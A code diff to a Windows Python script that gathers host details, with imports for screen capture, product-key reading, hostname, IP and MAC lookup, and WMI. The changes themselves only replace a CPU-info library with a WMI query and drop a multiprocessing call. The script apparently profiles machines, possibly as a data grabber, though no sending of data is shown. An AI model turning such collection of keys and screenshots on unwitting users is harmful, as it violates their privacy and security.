@@ -12,9 +12,7 @@ import win32api
 import traceback
 import win32con
 import random
-import multiprocessing
 from PIL import ImageGrab
-from cpuinfo import get_cpu_info
 import ctypes
 import sys
 import windows_tools.product_key
@@ -42,6 +40,7 @@ from socket import gethostname, gethostbyname
 from uuid import getnode
 import logging
 import wmi
+from win32com.client import GetObject
 
 # Configuration
 debugger = False
@@ -83,7 +82,9 @@ try:
 except:
     gpuName = "Unknown"
 try:
-    cpuInfo = get_cpu_info()['brand_raw']
+    root_winmgmts = GetObject("winmgmts:root\cimv2")
+    cpus = root_winmgmts.ExecQuery("Select * from Win32_Processor")
+    cpuInfo = cpus[0].Name
 except:
     cpuInfo = "Unknown"
     pass
@@ -584,7 +585,6 @@ class Logger():
             pass
 
 if __name__ == '__main__':
-    multiprocessing.freeze_support()
     if debugger == True:
         Logger.debug()
     elif debugger == False:
